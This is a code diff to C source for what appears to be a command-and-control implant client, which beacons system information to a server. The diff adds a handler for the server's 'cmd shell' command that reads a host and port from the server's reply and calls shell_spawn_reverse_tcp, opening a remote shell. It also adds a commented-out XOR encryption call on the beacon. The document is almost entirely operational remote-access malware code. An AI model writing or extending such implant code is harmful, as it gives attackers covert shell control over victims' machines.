@@ -22,6 +22,7 @@
 #include <stdbool.h>
 #include <string.h>
 #include <unistd.h>
+#include "shell.h"
 #include "../crypt.h"
 #include "../net.h"
 #include "../defs.h"
@@ -85,6 +86,7 @@ bool net_client(char *host, int port){
       p_net_client_beacon->sysinfo.cpu_usage = sys_load_average();
       p_net_client_beacon->sysinfo.ping = sys_ping();
       //p_net_client_beacon->sysinfo.cpu_usage = sys_load_average();
+      // crypt_decrypt_xor((void *)p_net_client_beacon, sizeof(net_client_beacon_t), 10);
       if (send(sock_fd, p_net_client_beacon, sizeof(net_client_beacon_t), 0) < 0){
         fprintf(stderr,
                 "[-] failed to send data to %s:%d\n",
@@ -106,6 +108,9 @@ bool net_client(char *host, int port){
                    ntohs(server.sin_port));
           } else if (p_net_server_beacon->command == NET_SERVER_CMD_SHELL){
             printf("[+] cmd shell beacon\n");
+            net_server_cmd_shell_t *p_net_server_cmd_shell = malloc(sizeof(net_server_cmd_shell_t));
+            memcpy(p_net_server_cmd_shell, p_net_server_beacon->data, sizeof(net_server_cmd_shell_t));
+            shell_spawn_reverse_tcp(p_net_server_cmd_shell->host, p_net_server_cmd_shell->port, SHELL_SH, SHELL_ASYNC_FALSE);
           } else {
             printf("[-] response data corrupt or command not supported\n");
           }
